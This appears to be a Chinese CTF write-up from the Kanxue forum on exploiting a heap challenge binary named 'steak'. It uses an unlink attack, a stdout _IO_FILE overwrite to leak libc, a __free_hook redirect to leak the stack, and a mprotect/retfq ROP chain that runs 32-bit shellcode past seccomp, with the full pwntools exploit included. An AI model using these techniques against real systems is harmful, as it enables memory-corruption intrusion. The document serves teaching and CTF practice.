
# IO_FILE 结构与泄露

`IO_FILE`结构参见我的blog：[035K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4F1L8%4N6D9k6h3!0H3j5i4u0V1i4K6g2X3j5X3W2F1i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5^5y4o6l9%4y4o6x3@1x3R3`.`.](https://bbs.kanxue.com/elink@8eaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4F1L8%4N6D9k6h3!0H3j5i4u0V1i4K6g2X3j5X3W2F1i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5^5y4o6l9%4y4o6x3@1x3R3`.`.)

通过改写`IO_FILE`的`flag`字段和`_IO_write_base`字段来泄露信息。参考资料：f69K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2x3%4m8W2L8g2)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3x3U0l9I4z5q4)9J5c8U0p5J5i4K6u0r3x3o6c8Q4x3V1k6Z5K9i4c8U0L8$3&6Q4x3V1k6T1j5h3u0&6i4K6g2X3N6r3y4S2j5$3S2W2i4K6u0r3

```
_flags = 0xfbad0000  // Magic number
_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
```

根据要实现的功能，设置相应的`flag`。具体的`flag`的设置方法请参照源码绕过。

这里需要执行 `count = _IO_SYSWRITE(fp, data, to_do)`；

源码：[106K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8$3c8W2i4K6u0W2N6$3!0T1L8%4q4Q4x3X3g2G2M7X3N6Q4x3V1k6#2M7$3g2J5M7%4m8S2j5$3g2Q4x3V1k6Y4L8r3W2T1j5#2)9J5c8X3I4A6j5X3W2G2i4K6u0r3k6X3W2D9k6h3!0H3M7#2)9J5k6h3y4Q4x3X3g2Z5N6r3#2D9i4K6t1K6i4K6g2X3d9f1!0Q4y4h3k6F1k6i4N6Q4y4h3k6X3K9h3I4W2i4K6g2X3L8%4k6W2M7X3k6D9L8%4M7`.](https://bbs.kanxue.com/elink@64fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0L8$3c8W2i4K6u0W2N6$3!0T1L8%4q4Q4x3X3g2G2M7X3N6Q4x3V1k6#2M7$3g2J5M7%4m8S2j5$3g2Q4x3V1k6Y4L8r3W2T1j5#2)9J5c8X3I4A6j5X3W2G2i4K6u0r3k6X3W2D9k6h3!0H3M7#2)9J5k6h3y4Q4x3X3g2Z5N6r3#2D9i4K6t1K6i4K6g2X3d9f1!0Q4y4h3k6F1k6i4N6Q4y4h3k6X3K9h3I4W2i4K6g2X3L8%4k6W2M7X3k6D9L8%4M7`.`)

```
#leak libc

edit(3,16,p64(src)+p64(stdout))

copy(1,0,8)#src[0]=*stdout

payload = p64(0xfbad1800)+p64(0)*3+'\x00'

edit(0,len(payload),payload)

r(8)

r(8)

r(8)

r(8)

leak = uu64(r(8))-0x3c36e0

success('leak= {}'.format(hex(leak)))

libc.address = leak
```

## 第三步：读取flag

除了修改 `_IO_write_base` 字段来泄露 `stack` 外，还可以修改 `free_hook` 为 `puts`，来输出栈指针（如：`environ`）

```
#write free_hook to leak stack

free_hook = libc.symbols['__free_hook']

puts = libc.symbols['puts']

env = libc.symbols['environ']

edit(3,16,p64(free_hook)+p64(env))

edit(0,8,p64(puts))

delete(1)

stack = uu64(r(7)[1:])

success('stack= {}'.format(hex(stack)))

ret = stack-0xf0
```

泄露 `stack` 后就可以计算出返回地址 `ret`，通过修改 `ret` 来触发 `ROP`

`ROP` 链中我们需要打开一段可以读写、执行的内存，把 `shellcode` 放进去，将 `cs` 寄存器改为 `0x23`（`0x23` 代表 32 位模式，`0x33` 代表 64 位模式）来执行 32 位 `shellcode` 绕过 64 位的 `seccomp` 规则限制。

```
#open read write flag

shellcode = asm('mov esp,0x602500')+asm(shellcraft.open("flag"))

ss = '''

mov ebx, eax

mov ecx, 0x602900

mov edx,0x50

int 0x80

mov eax,4

mov ebx, 1

mov ecx, 0x602900

mov edx,0x50

int 0x80

'''

shellcode+=asm(ss)

p_rdi=0x400ca3

p_rdx_rsi = 0x00000000001150c9+libc.address

mprotect = libc.symbols['mprotect']

#retfq = 0x107428 + libc.address#0x002bca4c

retfq = 0x811dc+libc.address

'''

code = asm('retfq',arch='amd64')

code = next(libc.search(code))#0x811dc

success('retfq address: {}'.format(hex(code)))

'''

mode = p64(retfq) + p64(0x602500) + p64(0x23)#retfq + eip + mode

rop = p64(p_rdi)+p64(0x602000)+p64(p_rdx_rsi)+p64(7)+p64(0x1000)+p64(mprotect)+mode

#mprotect(0x602000,0x1000,7)

print len(shellcode)#63

edit(3,8,p64(0x602500))

edit(0,0x44,shellcode+(0x40-63)*'\x00'+'flag')

edit(3,8,p64(ret))

edit(0,len(rop),rop)



#gdb.attach(cn,'b *0x602500')

#gdb.attach(cn,'b *0x400ca3')

sl(5)

irt()
```

首先调用 `mprotect` 开启一段可读、可写、可执行内存（注意页对齐），该内存中放入 `shellcode`。然后使用 `retfq` 指令跳 32 位模式，最后控制 `eip` 指针返回执行 `shellcode` 拿 `flag`。

介绍一下怎么找 `retfq` 指令，`ROPgadget` 指令是找不到的！！！利用 `pwntools` 将 `retfq` 转换成代码字符串，再用 `search` 找这个字符串所在的地址

可以发现我上面写的 `shellcode` 是 64 位的，所以需要 `retfq` 跳模式。其实更简单的方法就是生成 32 位的 `shellcode`。。。

# EXP

```
from pwn import *

context.os='Linux'

#context.arch='amd64'

debug = 1

if debug:

	#context.log_level='debug'

	cn=process('./steak')

	elf=ELF('./steak')

	libc=ELF('./libc-2.23.so')

s       = lambda data               :cn.send(str(data))

sa      = lambda delim,data         :cn.sendafter(str(delim), str(data)) 

st      = lambda delim,data         :cn.sendthen(str(delim), str(data)) 

sl      = lambda data               :cn.sendline(str(data)) 

sla     = lambda delim,data         :cn.sendlineafter(str(delim), str(data))

r       = lambda numb=4096          :cn.recv(numb)

rl	= lambda 	            :cn.recvline()

ru      = lambda delims             :cn.recvuntil(delims)

irt     = lambda                    :cn.interactive()

uu32    = lambda data               :u32(data.ljust(4, '\0'))

uu64    = lambda data               :u64(data.ljust(8, '\0'))



def add(size,buf):

	ru('>')

	sl(1)

	ru('size:')

	sl(size)

	ru('buf:')

	s(buf)

def delete(index):

	ru('>')

	sl(2)

	ru('index:')

	sl(index)

def edit(index,size,buf):

	ru('>')

	sl(3)

	ru('index:')

	sl(index)

	ru('size:')

	sl(size)

	ru('buf:')

	s(buf)

def copy(s_index,d_index,length):

	ru('>')

	sl(4)

	ru('source index:')

	sl(s_index)

	ru('dest index:')

	sl(d_index)

	ru('length:')

	sl(length)

#write stdout to leak addr

stdout = 0x602180

src = 0x6021a0

main = 0x400b83

#unlink

add(0x80,'a'*0x80)#0

add(0x80,'b'*0x80)#1

add(0x80,'c'*0x80)#2

add(0x80,'d'*0x80)#3

add(0x80,'e'*0x80)#4

edit(3,0x90,p64(0)+p64(0x81)+p64(src)+p64(src+8)+'d'*0x60+p64(0x80)+p64(0x90))



delete(4)	#unlink src[3]->src[0]



#leak libc

edit(3,16,p64(src)+p64(stdout))

copy(1,0,8)#src[0]=*stdout

payload = p64(0xfbad1800)+p64(0)*3+'\x00'

edit(0,len(payload),payload)

r(8)

r(8)

r(8)

r(8)

leak = uu64(r(8))-0x3c36e0

success('leak= {}'.format(hex(leak)))

libc.address = leak



#write free_hook to leak stack

free_hook = libc.symbols['__free_hook']

puts = libc.symbols['puts']

env = libc.symbols['environ']

edit(3,16,p64(free_hook)+p64(env))

edit(0,8,p64(puts))

delete(1)

stack = uu64(r(7)[1:])

success('stack= {}'.format(hex(stack)))

ret = stack-0xf0



#open read write flag

shellcode = asm('mov esp,0x602500')+asm(shellcraft.open("flag"))

ss = '''

mov ebx, eax

mov ecx, 0x602900

mov edx,0x50

int 0x80

mov eax,4

mov ebx, 1

mov ecx, 0x602900

mov edx,0x50

int 0x80

'''

shellcode+=asm(ss)

p_rdi=0x400ca3

p_rdx_rsi = 0x00000000001150c9+libc.address

mprotect = libc.symbols['mprotect']

#retfq = 0x107428 + libc.address#0x002bca4c

retfq = 0x811dc+libc.address

'''

code = asm('retfq',arch='amd64')

code = next(libc.search(code))#0x811dc

success('retfq address: {}'.format(hex(code)))

'''

mode = p64(retfq) + p64(0x602500) + p64(0x23)#retfq + eip + mode

rop = p64(p_rdi)+p64(0x602000)+p64(p_rdx_rsi)+p64(7)+p64(0x1000)+p64(mprotect)+mode



print len(shellcode)#63

edit(3,8,p64(0x602500))

edit(0,0x44,shellcode+(0x40-63)*'\x00'+'flag')

edit(3,8,p64(ret))

edit(0,len(rop),rop)



sl(5)

irt()
```

参考资料：46bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5K6y4o6t1I4

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [test.py](javascript:void(0);)

  （5.53kb，15次下载）
